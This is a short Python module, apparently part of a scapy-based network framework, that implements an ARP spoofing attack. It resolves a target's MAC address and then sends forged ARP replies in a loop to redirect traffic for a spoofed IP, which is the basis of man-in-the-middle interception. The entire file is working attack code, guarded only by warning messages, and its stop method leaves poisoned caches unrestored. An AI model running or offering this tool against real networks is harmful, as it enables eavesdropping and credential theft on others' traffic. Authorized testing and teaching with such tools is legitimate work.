\"\"\"
ARP Spoofing Attack Module

WARNING: This module is for EDUCATIONAL and AUTHORIZED TESTING ONLY.
\"\"\"

from typing import Optional
from scapy.all import ARP, send, conf
import time
from scapy_framework.core.logger import get_logger
from scapy_framework.utils.validators import is_valid_ip

logger = get_logger(__name__)

class ARPSpoofer:
    \"\"\"ARP Spoofing - USE ONLY WITH AUTHORIZATION\"\"\"
    
    def __init__(self, interface: Optional[str] = None):
        self.interface = interface or conf.iface
        self.is_spoofing = False
        logger.warning("ARP Spoofer initialized - USE RESPONSIBLY")
    
    def spoof(self, target_ip: str, spoofed_ip: str, target_mac: Optional[str] = None, interval: float = 2.0) -> None:
        if not is_valid_ip(target_ip) or not is_valid_ip(spoofed_ip):
            raise ValueError("Invalid IP address")
        
        logger.warning(f"Starting ARP spoofing: {target_ip} <- {spoofed_ip}")
        logger.warning("ETHICAL WARNING: Ensure authorization!")
        
        if not target_mac:
            from scapy_framework.scanner.arp_scanner import ARPScanner
            scanner = ARPScanner(interface=self.interface)
            results = scanner.scan(f"{target_ip}/32")
            if results:
                target_mac = results[0]['mac']
            else:
                raise ValueError(f"Could not resolve MAC for {target_ip}")
        
        self.is_spoofing = True
        try:
            while self.is_spoofing:
                arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
                send(arp_response, iface=self.interface, verbose=False)
                time.sleep(interval)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self) -> None:
        self.is_spoofing = False
        logger.info("ARP spoofing stopped")
